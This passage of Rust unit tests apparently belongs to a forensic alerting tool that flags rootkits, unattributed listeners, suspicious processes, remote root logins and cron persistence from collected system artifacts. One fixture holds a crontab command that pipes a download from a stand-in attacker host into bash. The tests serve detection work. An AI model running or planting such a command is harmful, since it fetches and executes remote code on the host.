    fn rootkit_multiple_findings_all_converted() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![
            RootkitFinding {
                severity: RootkitSeverity::Critical,
                check: "kernel_module".into(),
                description: "diamorphine loaded".into(),
                evidence: "diamorphine".into(),
            },
            RootkitFinding {
                severity: RootkitSeverity::Warning,
                check: "kernel_taint".into(),
                description: "Unsigned module".into(),
                evidence: "taint=4096".into(),
            },
            RootkitFinding {
                severity: RootkitSeverity::Info,
                check: "kernel_taint".into(),
                description: "Proprietary module".into(),
                evidence: "taint=1".into(),
            },
        ];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert_eq!(rootkit_alerts.len(), 3);
    }

    // =====================================================================
    // Cross-parser correlation — enriched rootkit alerts
    // =====================================================================

    #[test]
    fn rootkit_ld_preload_enriched_with_bodyfile_metadata() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libevil.so".into(),
        }];
        let bodyfile = vec![BodyfileEntry {
            md5: "d41d8cd98f00b204e9800998ecf8427e".into(),
            path: "/lib/libevil.so".into(),
            inode: 12345,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 98304,
            atime: Some(1_700_000_000),
            mtime: Some(1_700_000_000),
            ctime: Some(1_700_000_000),
            crtime: None,
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            bodyfile: &bodyfile,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("size=98304"),
            "expected bodyfile size in detail, got: {detail}"
        );
        assert!(
            detail.contains("mode=100755"),
            "expected bodyfile mode in detail, got: {detail}"
        );
    }

    #[test]
    fn rootkit_ld_preload_enriched_with_hash() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Critical,
            check: "ld_preload".into(),
            description: "Known rootkit library in ld.so.preload: jynx".into(),
            evidence: "/lib/libjynx.so".into(),
        }];
        let hashes = vec![HashedExecutable {
            hash: "abc123def456".into(),
            path: "/lib/libjynx.so".into(),
            algorithm: "md5".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            hashes: &hashes,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("md5=abc123def456"),
            "expected hash in detail, got: {detail}"
        );
    }

    #[test]
    fn rootkit_ld_preload_enriched_with_both_bodyfile_and_hash() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libymv.so.3".into(),
        }];
        let bodyfile = vec![BodyfileEntry {
            md5: String::new(),
            path: "/lib/libymv.so.3".into(),
            inode: 999,
            mode: "100644".into(),
            uid: 0,
            gid: 0,
            size: 45056,
            atime: Some(1_700_000_000),
            mtime: Some(1_695_000_000),
            ctime: Some(1_695_000_000),
            crtime: None,
        }];
        let hashes = vec![HashedExecutable {
            hash: "deadbeef12345678".into(),
            path: "/lib/libymv.so.3".into(),
            algorithm: "sha1".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            bodyfile: &bodyfile,
            hashes: &hashes,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("size=45056"),
            "expected bodyfile size, got: {detail}"
        );
        assert!(
            detail.contains("sha1=deadbeef12345678"),
            "expected hash, got: {detail}"
        );
    }

    #[test]
    fn rootkit_non_ld_preload_not_enriched() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        // kernel_module findings have no file path to cross-reference
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Critical,
            check: "kernel_module".into(),
            description: "Known rootkit kernel module 'diamorphine' loaded".into(),
            evidence: "diamorphine".into(),
        }];
        // Even with bodyfile/hash data present, non-ld_preload findings shouldn't be enriched
        let bodyfile = vec![BodyfileEntry {
            md5: String::new(),
            path: "/some/unrelated/file".into(),
            inode: 1,
            mode: "100644".into(),
            uid: 0,
            gid: 0,
            size: 100,
            atime: None,
            mtime: None,
            ctime: None,
            crtime: None,
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            bodyfile: &bodyfile,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert_eq!(rootkit_alerts.len(), 1);
        assert_eq!(rootkit_alerts[0].detail, "diamorphine");
    }

    #[test]
    fn rootkit_ld_preload_no_bodyfile_match_shows_not_found() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libghost.so".into(),
        }];
        // Empty bodyfile — the library isn't on disk
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("not found in bodyfile"),
            "expected 'not found in bodyfile' when no match, got: {detail}"
        );
    }

    // =====================================================================
    // Unattributed connection detection
    // =====================================================================

    #[test]
    fn unattributed_listen_connection_flagged() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:3333".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: None,
            program: None,
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.category == "network"
                && a.message.contains("Unattributed")
                && a.message.contains("LISTEN")),
            "expected unattributed LISTEN alert, got: {alerts:?}"
        );
    }

    #[test]
    fn unattributed_established_connection_flagged() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "192.168.1.10:45678".into(),
            remote_addr: "10.0.0.5:443".into(),
            state: "ESTAB".into(),
            pid: None,
            program: None,
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.category == "network"
                && a.message.contains("Unattributed")
                && a.message.contains("ESTAB")),
            "expected unattributed ESTABLISHED alert, got: {alerts:?}"
        );
    }

    #[test]
    fn attributed_listen_no_unattributed_alert() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:22".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: Some(1234),
            program: Some("sshd".into()),
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts.iter().any(|a| a.message.contains("Unattributed")),
            "should not flag attributed connection, got: {alerts:?}"
        );
    }

    #[test]
    fn unattributed_closed_wait_not_flagged() {
        // CLOSE-WAIT and TIME-WAIT are transient — only flag active states
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "192.168.1.10:45678".into(),
            remote_addr: "10.0.0.5:80".into(),
            state: "CLOSE-WAIT".into(),
            pid: None,
            program: None,
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts.iter().any(|a| a.message.contains("Unattributed")),
            "should not flag CLOSE-WAIT, got: {alerts:?}"
        );
    }

    // =====================================================================
    // Process-network correlation
    // =====================================================================

    #[test]
    fn temp_process_with_network_connection_critical() {
        let procs = vec![ProcessInfo {
            pid: 1234,
            ppid: 1,
            user: "www-data".into(),
            command: "/tmp/beacon".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "192.168.1.10:45678".into(),
            remote_addr: "10.0.0.5:443".into(),
            state: "ESTAB".into(),
            pid: Some(1234),
            program: Some("/tmp/beacon".into()),
        }];
        let input = AlertInput {
            processes: &procs,
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "correlation"
                && a.message.contains("/tmp/")),
            "expected critical correlation alert for temp process with network, got: {alerts:?}"
        );
    }

    #[test]
    fn temp_process_with_network_includes_hash_enrichment() {
        let procs = vec![ProcessInfo {
            pid: 42,
            ppid: 1,
            user: "nobody".into(),
            command: "/dev/shm/.hidden".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:9999".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: Some(42),
            program: Some(".hidden".into()),
        }];
        let hashes = vec![HashedExecutable {
            hash: "deadbeefcafe1234".into(),
            path: "/dev/shm/.hidden".into(),
            algorithm: "md5".into(),
        }];
        let input = AlertInput {
            processes: &procs,
            network: &conns,
            hashes: &hashes,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let corr: Vec<_> = alerts
            .iter()
            .filter(|a| a.category == "correlation" && a.message.contains("/dev/shm/"))
            .collect();
        assert!(!corr.is_empty(), "expected correlation alert");
        assert!(
            corr[0].detail.contains("deadbeefcafe1234"),
            "expected hash in detail, got: {}",
            corr[0].detail
        );
    }

    #[test]
    fn connection_pid_not_in_process_list_flagged() {
        let procs = vec![ProcessInfo {
            pid: 1,
            ppid: 0,
            user: "root".into(),
            command: "/sbin/init".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:4444".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: Some(9999),
            program: None,
        }];
        let input = AlertInput {
            processes: &procs,
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.category == "correlation" && a.detail.contains("9999")),
            "expected alert for PID not in process list, got: {alerts:?}"
        );
    }

    #[test]
    fn normal_system_process_with_connection_no_correlation_alert() {
        let procs = vec![ProcessInfo {
            pid: 100,
            ppid: 1,
            user: "root".into(),
            command: "/usr/sbin/sshd".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:22".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: Some(100),
            program: Some("sshd".into()),
        }];
        let input = AlertInput {
            processes: &procs,
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.category == "correlation" && a.message.contains("sshd")),
            "should not flag normal sshd, got: {alerts:?}"
        );
    }

    // =====================================================================
    // Login anomaly detection
    // =====================================================================

    #[test]
    fn root_login_from_remote_host_critical() {
        let logins = vec![LoginRecord {
            user: "root".into(),
            terminal: "pts/0".into(),
            source: "10.0.0.50".into(),
            login_time: Some("Mon Mar 24 10:00 2026".into()),
            logout_time: None,
            duration: None,
        }];
        let input = AlertInput {
            logins: &logins,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "auth"
                && a.message.contains("root")),
            "expected critical root remote login alert, got: {alerts:?}"
        );
    }

    #[test]
    fn root_login_local_console_not_flagged() {
        let logins = vec![LoginRecord {
            user: "root".into(),
            terminal: "tty1".into(),
            source: String::new(),
            login_time: Some("Mon Mar 24 10:00 2026".into()),
            logout_time: None,
            duration: None,
        }];
        let input = AlertInput {
            logins: &logins,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.category == "auth" && a.severity == AlertSeverity::Critical),
            "should not flag local console root login as critical, got: {alerts:?}"
        );
    }

    #[test]
    fn unique_login_source_flagged() {
        let logins = vec![
            LoginRecord {
                user: "admin".into(),
                terminal: "pts/0".into(),
                source: "192.168.1.100".into(),
                login_time: None,
                logout_time: None,
                duration: None,
            },
            LoginRecord {
                user: "admin".into(),
                terminal: "pts/1".into(),
                source: "192.168.1.100".into(),
                login_time: None,
                logout_time: None,
                duration: None,
            },
            LoginRecord {
                user: "admin".into(),
                terminal: "pts/2".into(),
                source: "10.99.99.99".into(),
                login_time: None,
                logout_time: None,
                duration: None,
            },
        ];
        let input = AlertInput {
            logins: &logins,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.category == "auth"
                && a.message.contains("Unique login source")
                && a.detail.contains("10.99.99.99")),
            "expected unique source alert for 10.99.99.99, got: {alerts:?}"
        );
    }

    #[test]
    fn all_same_login_source_no_unique_alert() {
        let logins = vec![
            LoginRecord {
                user: "admin".into(),
                terminal: "pts/0".into(),
                source: "192.168.1.100".into(),
                login_time: None,
                logout_time: None,
                duration: None,
            },
            LoginRecord {
                user: "admin".into(),
                terminal: "pts/1".into(),
                source: "192.168.1.100".into(),
                login_time: None,
                logout_time: None,
                duration: None,
            },
        ];
        let input = AlertInput {
            logins: &logins,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.message.contains("Unique login source")),
            "should not flag when all sources are the same, got: {alerts:?}"
        );
    }

    // =====================================================================
    // Suspicious listener detection
    // =====================================================================

    #[test]
    fn listener_on_backdoor_port_flagged() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:4444".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: Some(1234),
            program: Some("nc".into()),
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.message.contains("4444") && a.category == "network"),
            "expected suspicious port alert for 4444, got: {alerts:?}"
        );
    }

    #[test]
    fn listener_on_standard_port_not_flagged_as_suspicious() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:80".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: Some(100),
            program: Some("nginx".into()),
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.message.contains("suspicious") || a.message.contains("Suspicious")),
            "should not flag port 80 as suspicious, got: {alerts:?}"
        );
    }

    // =====================================================================
    // Persistence correlation (crontab × bodyfile)
    // =====================================================================

    #[test]
    fn crontab_tmp_file_in_bodyfile_critical() {
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "/tmp/updater.sh".into(),
            user: "root".into(),
        }];
        let bodyfile = vec![BodyfileEntry {
            md5: String::new(),
            path: "/tmp/updater.sh".into(),
            inode: 500,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 2048,
            atime: None,
            mtime: Some(1_700_000_000),
            ctime: None,
            crtime: None,
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            bodyfile: &bodyfile,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "correlation"
                && a.message.contains("persistence")
                && a.detail.contains("size=2048")),
            "expected persistence alert with bodyfile enrichment, got: {alerts:?}"
        );
    }

    #[test]
    fn crontab_tmp_file_missing_from_bodyfile_warning() {
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "/tmp/ghost.sh".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            bodyfile: &[], // empty bodyfile — file not found
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.category == "correlation"
                && a.message.contains("missing")
                && a.message.contains("/tmp/ghost.sh")),
            "expected missing temp file alert, got: {alerts:?}"
        );
    }

    #[test]
    fn crontab_normal_command_no_persistence_alert() {
        let crontabs = vec![CrontabEntry {
            schedule: "0 2 * * *".into(),
            command: "/usr/bin/logrotate /etc/logrotate.conf".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.category == "correlation" && a.message.contains("persistence")),
            "should not flag normal logrotate crontab, got: {alerts:?}"
        );
    }

    // =====================================================================
    // Rootkit compound indicators
    // =====================================================================

    #[test]
    fn rootkit_plus_unattributed_compound_critical() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Critical,
            check: "kernel_module".into(),
            description: "diamorphine loaded".into(),
            evidence: "diamorphine".into(),
        }];
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:3333".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: None,
            program: None,
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "correlation"
                && a.message.contains("hidden")),
            "expected compound rootkit+network alert, got: {alerts:?}"
        );
    }

    #[test]
    fn rootkit_plus_suspicious_crontab_persistence_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library in ld.so.preload".into(),
            evidence: "/lib/libevil.so".into(),
        }];
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "curl http://evil.com/update | bash".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.category == "correlation" && a.message.contains("persistence")),
            "expected rootkit+crontab persistence alert, got: {alerts:?}"
        );
    }

    #[test]
    fn multi_vector_rootkit_across_categories() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![
            RootkitFinding {
                severity: RootkitSeverity::Critical,
                check: "kernel_module".into(),
                description: "diamorphine loaded".into(),
                evidence: "diamorphine".into(),
            },
            RootkitFinding {
                severity: RootkitSeverity::Warning,
                check: "ld_preload".into(),
                description: "Library in ld.so.preload".into(),
                evidence: "/lib/libevil.so".into(),
            },
        ];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.category == "correlation" && a.message.contains("Multi-vector")),
            "expected multi-vector rootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn single_rootkit_finding_no_compound_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Info,
            check: "kernel_taint".into(),
            description: "Proprietary module".into(),
            evidence: "taint=1".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.category == "correlation" && a.message.contains("compound")),
            "single info finding should not trigger compound alert, got: {alerts:?}"
        );
    }
}
